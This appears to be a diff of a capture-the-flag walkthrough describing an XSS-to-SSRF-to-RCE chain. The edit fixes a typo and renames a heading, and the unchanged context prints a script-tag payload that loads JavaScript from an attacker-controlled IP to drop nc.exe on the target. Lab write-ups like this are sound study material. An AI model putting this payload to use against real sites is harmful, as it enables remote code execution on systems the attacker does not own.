@@ -378,9 +378,9 @@ I tried a bunch of Curl post request spoofing the headers to make it look like t
 
 After taken a short break, I then observed that since maybe we can't manipulate the backdoorchecker field from our host. Why not just go back to the XSS we found in the coin transfer and do SSRF to get a RCE. In-fucking-deed! 
 
-let's weponize this mothafucker.
+let's weaponize this mothafucker.
 
-### Weaponization: XSS->SSRF->RCE
+### Weaponization/Delivery/Exploitation/Installation: XSS->SSRF->RCE
 
 XSS To drop nc.exe:
 `<script src=http://10.10.14.5/payd.js%3E</script>`
@@ -416,13 +416,6 @@ function paintfunc(){
 
 paintfunc();
 ```
-
-
-### Exploitation
-The malware begins executing on the target system
-
-### Installation
-The malware installs a backdoor or other ingress accessible to the attacker
 
 ### Command and Control
 The intruder gains persistent access to the victimâ€™s systems/network
